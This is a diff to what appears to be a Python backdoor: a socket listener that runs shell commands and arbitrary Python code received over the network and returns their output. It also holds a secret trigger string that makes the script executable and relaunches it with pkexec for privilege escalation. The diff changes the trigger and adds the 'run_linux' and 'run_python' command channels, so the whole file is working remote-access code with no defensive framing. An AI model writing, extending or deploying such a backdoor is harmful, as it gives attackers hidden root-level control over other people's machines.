@@ -95,9 +95,9 @@ def handle_conn(conn, addr):
                 data = conn.recv(1024)
                 if not data:
                     break
-                data = data.strip()
+                data = data.strip()                    
 
-                if data == b"privesc":
+                if data == b"supersecretsuperstring": # privesc key here
                     subprocess.run(["chmod", "+x", THIS_FILE])
                     subprocess.Popen(["pkexec", THIS_FILE])
                     sys.exit(0) 
@@ -106,20 +106,39 @@ def handle_conn(conn, addr):
                 if not command:
                     continue
 
-                print("running: " + command)
-                result = run_command(command)
-                response = result.stdout + result.stderr
-                if not response: 
-                    response = f"Command executed. Exit code: {result.returncode}"
-                conn.sendall(response.encode("utf-8", errors="replace"))
+                # Run bash commands with `echo run_linux [command here]`
+                if command.startswith("run_linux "):
+                    bash = command[10:].strip()
+                    if not bash:
+                        break
+
+                    print("running linux command: " + bash)
+                    result = run_command(bash)
+
+                    response = result.stdout + result.stderr
+                    if not response: 
+                        response = f"Command executed. Exit code: {result.returncode}"
+                    conn.sendall(response.encode("utf-8", errors="replace"))
+                # Run Python code with `echo run_python [code here]`
+                elif command.startswith("run_python "): 
+                    python_code = command[11:].strip()
+                    if not python_code:
+                        break
+
+                    print("running python command: " + python_code)
+                    result = subprocess.run([sys.executable, "-c", python_code], capture_output=True, text=True)
+
+                    response = result.stdout + result.stderr
+                    if not response: 
+                        response = f"Command executed. Exit code: {result.returncode}"
+                    conn.sendall(response.encode("utf-8", errors="replace"))
+
                 break
-            
             except Exception as e:
                 error_msg = f"Error: {str(e)}\n"
                 conn.sendall(error_msg.encode("utf-8"))
                 break
          
-
 
 def main():
     kill_others()
@@ -143,5 +162,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
